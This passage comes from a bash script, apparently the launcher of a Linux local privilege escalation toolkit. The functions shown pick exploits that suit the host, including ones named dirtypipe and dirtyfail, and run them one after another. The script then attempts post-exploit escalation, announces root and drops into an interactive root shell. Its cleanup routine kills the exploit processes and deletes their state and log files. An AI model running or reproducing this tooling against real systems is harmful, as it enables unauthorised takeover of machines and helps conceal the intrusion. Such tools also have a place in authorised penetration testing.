        if [ "$bin" = "python3" ]; then
            command -v python3 >/dev/null 2>&1 || continue
        elif [ ! -f "$SCRIPT_DIR/${bin#./}" ]; then
            continue
        fi
        if check_condition "$cond"; then
            log_ok "COMPATIBLE: ${name} — ${desc}"
            matched=$((matched + 1))
        fi
    done
    echo ""
    if [ $matched -gt 0 ]; then
        log_ok "${matched} exploit(s) match this host"
        log_info "Run without --scan to attempt them in order"
    else
        log_warn "No compatible exploits found for this host"
    fi
}

# --- Run single exploit ---
run_single() {
    local target="$1"
    local found=false
    for name in "${EX_ORDER[@]}"; do
        if [ "${name,,}" = "${target,,}" ]; then
            found=true
            local bin="${EX_BIN[$name]}"
            local flags="${EX_FLAGS[$name]}"
            local cond="${EX_COND[$name]}"
            if [ "$bin" = "python3" ]; then
                command -v python3 >/dev/null 2>&1 || { log_err "python3 not found"; return 1; }
                [ -f "$SCRIPT_DIR/${flags##* }" ] || [ -f "$SCRIPT_DIR/${flags}" ] || { log_err "Script not found: ${flags}"; return 1; }
            elif [ ! -f "$SCRIPT_DIR/${bin#./}" ]; then
                log_err "Binary not found: ${bin}"
                return 1
            fi
            if ! check_condition "$cond"; then
                log_warn "Condition not met: ${cond}"
                log_warn "Continuing anyway (user-requested)..."
            fi
            run_exploit "$name" "$bin" "$flags"
            return $?
        fi
    done
    if ! $found; then
        log_err "Exploit '${target}' not found in toolkit"
        log_info "Use --list to see available exploits"
        return 1
    fi
}

# --- Shell picker ---
shell_picker() {
    list_exploits
    echo ""
    echo -e "${YLW}Enter exploit number (or name) to run, or 'q' to quit:${NC}"
    while true; do
        echo -ne "${GRN}lpe>${NC} "
        read -r choice
        [ "$choice" = "q" ] && break
        [ -z "$choice" ] && continue
        if [[ "$choice" =~ ^[0-9]+$ ]]; then
            local idx=$((choice - 1))
            if [ $idx -ge 0 ] && [ $idx -lt ${#EX_ORDER[@]} ]; then
                run_single "${EX_ORDER[$idx]}"
            else
                log_err "Invalid number"
            fi
        else
            run_single "$choice"
        fi
    done
}

# --- Cleanup ---
cleanup_all() {
    log_title "CLEANUP"
    skip_watcher_stop
    rm -f "$SKIP_FILE" "$ABORT_FILE" 2>/dev/null || true
    pkill -f "dirtyfail" 2>/dev/null || true
    pkill -f "dirtypipe" 2>/dev/null || true
    rm -f /var/tmp/.dirtyfail*.state 2>/dev/null || true
    rm -f /var/tmp/.dirtyfail*.log 2>/dev/null || true
    echo 3 > /proc/sys/vm/drop_caches 2>/dev/null || true
    $HAS_TTY && stty ixon 2>/dev/null || true
    log_ok "Cleanup completed"
}

# --- Main auto-run loop ---
auto_run() {
    detect_system
    if check_already_root; then
        log_ok "Already root — nothing to do!"
        return 0
    fi
    log_title "STARTING AUTO LPE"
    echo ""
    local total=0
    local tried=0
    local skipped=0
    for name in "${EX_ORDER[@]}"; do
        [ "$ROOT_SHELL_OBTAINED" = true ] && ! $KEEP_GOING && break
        total=$((total + 1))
        local bin="${EX_BIN[$name]}"
        local flags="${EX_FLAGS[$name]}"
        local cond="${EX_COND[$name]}"
        local desc="${EX_DESC[$name]}"
        if [ "$bin" = "python3" ]; then
            if ! command -v python3 >/dev/null 2>&1; then
                log_warn "SKIP ${name}: python3 not found"
                skipped=$((skipped + 1))
                continue
            fi
        elif [ ! -f "$SCRIPT_DIR/${bin#./}" ]; then
            log_warn "SKIP ${name}: binary not found (${bin})"
            skipped=$((skipped + 1))
            continue
        fi
        if ! check_condition "$cond"; then
            log_warn "SKIP ${name}: condition not met (${cond})"
            skipped=$((skipped + 1))
            continue
        fi
        tried=$((tried + 1))
        run_exploit "$name" "$bin" "$flags"
        local rc=$?
        if [ $rc -eq 4 ]; then
            echo -e "${YLW}  >>> Skipped by user — moving to next exploit...${NC}"
            echo ""
            continue
        fi
        if [ $rc -eq 5 ]; then
            echo -e "${RED}  >>> Aborted by user — stopping auto-run${NC}"
            echo ""
            break
        fi
        if [ $rc -eq 0 ]; then
            SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
            # Try to actually get a root shell via post-exploit methods
            if [ "$(id -u)" -eq 0 ]; then
                ROOT_SHELL_OBTAINED=true
            elif try_post_exploit_escalation "$name"; then
                ROOT_SHELL_OBTAINED=true
            fi
            if [ "$ROOT_SHELL_OBTAINED" = true ]; then
                log_ok "ROOT OBTAINED! uid=$(id -u)"
                if ! $KEEP_GOING; then
                    echo ""
                    log_ok "Stopping — got root. Use --keep-going to continue testing."
                    break
                fi
            fi
        else
            FAIL_COUNT=$((FAIL_COUNT + 1))
        fi
        echo ""
    done
    log_title "SUMMARY"
    echo -e "  ${GRY}Total exploits:${NC}   ${WHT}${total}${NC}"
    echo -e "  ${GRY}Tried:${NC}           ${WHT}${tried}${NC}"
    echo -e "  ${GRY}Skipped:${NC}         ${WHT}${skipped}${NC}"
    echo -e "  ${GRY}Successful:${NC}      ${GRN}${SUCCESS_COUNT}${NC}"
    echo -e "  ${GRY}Failed:${NC}          ${RED}${FAIL_COUNT}${NC}"
    echo -e "  ${GRY}Root obtained:${NC}   ${ROOT_SHELL_OBTAINED}"
    if $ROOT_SHELL_OBTAINED; then
        echo ""
        echo -e "${GRN}${BLD}╔════════════════════════════╗${NC}"
        echo -e "${GRN}${BLD}║  ROOT PRIVILEGE ESCALATED  ║${NC}"
        echo -e "${GRN}${BLD}╚════════════════════════════╝${NC}"
        echo ""
        echo -e "  ${WHT}uid=$(id -u) euid=$(id -u) gid=$(id -g)${NC}"
        echo -e "  ${WHT}$(whoami)@$(hostname)${NC}"
        echo ""
        if [ "$(id -u)" -eq 0 ]; then
            echo -e "${YLW}Dropping to root shell...${NC}"
            echo -e "${YLW}Type 'exit' to return to run.sh${NC}"
            echo ""
            /bin/bash -i
        fi
    fi
    echo ""
    log_info "Full log: ${RESULTS_FILE}"
}

# ============================================================================
# ARGUMENT PARSING
# ============================================================================
parse_args() {
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --list|-l)          LIST_ONLY=true; shift ;;
            --scan|-s)          SCAN_ONLY=true; shift ;;
            --exploit|-e)       EXPLOIT_TARGET="$2"; shift 2 ;;
            --dry-run|-n)       DRY_RUN=true; shift ;;
            --shell|-i)         SHELL_PICKER=true; shift ;;
            --cleanup|-c)       CLEANUP_MODE=true; shift ;;
            --keep-going|-k)    KEEP_GOING=true; shift ;;
            --timeout|-t)       TIMEOUT="$2"; shift 2 ;;
            --no-color)         NO_COLOR=1; shift ;;
            --json|-j)          JSON_MODE=true; shift ;;
            --help|-h)          sed -n '2,20s/^# \?//p' "$0"; exit 0 ;;
            *)                  log_err "Unknown option: $1"; echo "Use --help for usage"; exit 1 ;;
        esac
    done
}

# ============================================================================
# ENTRY POINT
# ============================================================================
main() {
    mkdir -p "$LOG_DIR"
    trap 'cleanup_all; exit 130' INT TERM
    trap 'cleanup_all' EXIT
    parse_args "$@"
    if $CLEANUP_MODE; then cleanup_all; exit 0; fi
    if $LIST_ONLY; then list_exploits; exit 0; fi
    if $SCAN_ONLY; then scan_only_mode; exit 0; fi
    if $SHELL_PICKER; then banner; detect_system; shell_picker; exit 0; fi
    if [ -n "$EXPLOIT_TARGET" ]; then banner; detect_system; run_single "$EXPLOIT_TARGET"; exit $?; fi
    banner
    detect_system
    skip_init
    auto_run
}

main "$@"
